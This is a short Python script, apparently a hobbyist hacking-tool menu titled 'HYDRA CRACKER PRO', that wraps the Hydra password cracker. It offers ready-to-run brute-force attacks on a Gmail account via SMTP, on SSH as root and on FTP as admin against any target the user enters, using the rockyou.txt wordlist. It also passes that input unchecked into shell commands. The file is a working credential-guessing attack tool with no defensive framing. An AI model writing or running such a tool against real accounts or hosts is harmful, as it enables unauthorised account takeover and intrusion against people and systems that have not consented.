# CREATED BY: RAMIZ UDDIN
import os, cyber_deps
cyber_deps.ensure_deps(system_pkgs=["hydra"])
def run():
    while True:
        os.system("clear")
        print("\033[1;36m" + "="*45)
        print("      HYDRA CRACKER PRO")
        print("      CREATED BY: RAMIZ UDDIN")
        print("="*45 + "\033[0m")
        print("\033[1;32m[1] Gmail Attack")
        print("[2] SSH Brute Force")
        print("[3] FTP Brute Force")
        print("[99] Uninstall Hydra")
        print("[0] Back\033[0m")
        c = input("\nHydra > ")
        if c == '0': break
        if c == '99': import cyber_deps; cyber_deps.remove_deps(["hydra"]); break
        email = input("\033[1;33mEnter Target Email/IP: \033[0m")
        wordlist = input("\033[1;33mWordlist (Enter for rockyou.txt): \033[0m") or "rockyou.txt"
        if c == '1': os.system(f"hydra -l {email} -P {wordlist} -s 465 -S -v -V -t 4 smtp.gmail.com smtp")
        elif c == '2': os.system(f"hydra -l root -P {wordlist} {email} ssh")
        elif c == '3': os.system(f"hydra -l admin -P {wordlist} {email} ftp")
        input("\n[Press Enter to Continue]")
if __name__ == "__main__": run()
